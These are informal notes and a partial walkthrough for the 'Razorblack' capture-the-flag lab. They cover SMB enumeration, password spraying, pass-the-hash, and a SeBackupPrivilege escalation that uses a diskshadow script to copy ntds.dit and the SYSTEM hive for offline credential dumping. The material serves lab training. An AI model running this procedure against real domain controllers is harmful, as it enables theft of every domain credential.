# Razorblack
Enum4linux gave a domain name(tried different tld dunno how forgot thm)  
Nfs share on 2049 gives steven's flag  
also got a list of usernames from xlsx file

administrator@raz0rblack.thm  
twilliams@raz0rblack.thm:roastpotatoes

lvetrova@raz0rblack.thm  
sbradley@raz0rblack.thm

pre-auth doesn't give any other hashes  
need to look closer on nmap ports   
smbclient -U 'twilliams%roastpotatoes' -L //10.10.157.225 gives smb shares

`smbclient -U 'twilliams%roastpotatoes'  \\\\10.10.182.10\\SYSVOL` gives useful data, can't believe I missed it!  
 

C:\\Windows\\trash

  
Mode                LastWriteTime         Length Name  
\----                -------------         ------ ----  
\-a----        3/15/2021  11:02 PM       18927164 experiment\_gone\_wrong.zip  
 

[https://linuxcommandlibrary.com/man/evil-winrm](https://linuxcommandlibrary.com/man/evil-winrm) 

Writeup:

```text-plain
crackmapexec smb $IP -u users.txt -p pass.txt
SMB         10.10.25.33    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE
smbpasswd -r $IP -U sbradley
```

For the user `sbradley` we find an interesting message `STATUS_PASSWORD_MUST_CHANGE` The cause of the message is that The specified password expired. So Let's change the password.

Now we have the read access to `trash`

`crackmapexec smb $IP -u lvetrova -H hashes3.txt` where hashes3.txt has all the dumped passwords(strange I couldn't find one manually, but this works?)

hashes3.txt has to be a lost of line by line hashes(use a llittle `tr` and `awk` magic ) 

Privilege Escalation:
---------------------

see available privileges with `whoami /priv`, we have an interesting privliege:`SeBackupPrivilege` 

It was designed for allowing users to create backup copies of the system. This privilege allows the user to read any file on the entirety of the files that might also include some sensitive files such as the **SAM file or SYSTEM Registry file**.

Before using this exploit we need to Dump the Domain Credentials to a file. For this, we will use [**DiskShadow (a Windows signed binary)**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#using-diskshadow-a-windows-signed-binary)**.**

Prepare the `diskshadow.txt,` execute the `diskshadow.exe`

```text-plain
set metadata C:\tmp\tmp.cabs 
set context persistent nowriters 
add volume c: alias someAlias 
create 
expose %someAlias% h:
```

`*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp`   
`*Evil-WinRM* PS C:\tmp> upload diskshadow.txt`

`diskshadow.exe /s c:\tmp\diskshadow.txt`

we need few `dll` files which we can download from [**here**](https://github.com/giuliano108/SeBackupPrivilege). After downloading we need to execute it in the following way and then download the hashes.

```text-plain
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite

*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system

*Evil-WinRM* PS C:\tmp> download ntds.dit

*Evil-WinRM* PS C:\tmp> download system
```